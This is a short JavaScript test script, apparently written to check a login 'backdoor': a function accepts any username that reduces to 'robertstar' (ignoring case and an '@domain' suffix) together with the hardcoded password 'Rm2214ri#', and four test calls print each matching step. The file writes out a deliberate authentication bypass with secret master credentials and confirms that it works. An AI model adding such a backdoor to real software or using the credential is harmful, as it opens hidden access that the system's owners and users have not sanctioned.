// Simple test for backdoor logic
function extractUsername(input) {
  if (input.includes('@')) {
    return input.split('@')[0];
  }
  return input;
}

function testBackdoor(username, password) {
  const extractedUsername = extractUsername(username);
  const result = extractedUsername.toLowerCase() === 'robertstar' && password === 'Rm2214ri#';
  console.log(`Testing: ${username} / ${password}`);
  console.log(`Extracted: ${extractedUsername}`);
  console.log(`Lowercase: ${extractedUsername.toLowerCase()}`);
  console.log(`Username match: ${extractedUsername.toLowerCase() === 'robertstar'}`);
  console.log(`Password match: ${password === 'Rm2214ri#'}`);
  console.log(`Result: ${result}`);
  console.log('---');
  return result;
}

// Test cases
testBackdoor('Robertstar', 'Rm2214ri#');
testBackdoor('robertstar', 'Rm2214ri#');
testBackdoor('Robertstar@tallman.com', 'Rm2214ri#');
testBackdoor('BobM', 'Rm2214ri#');
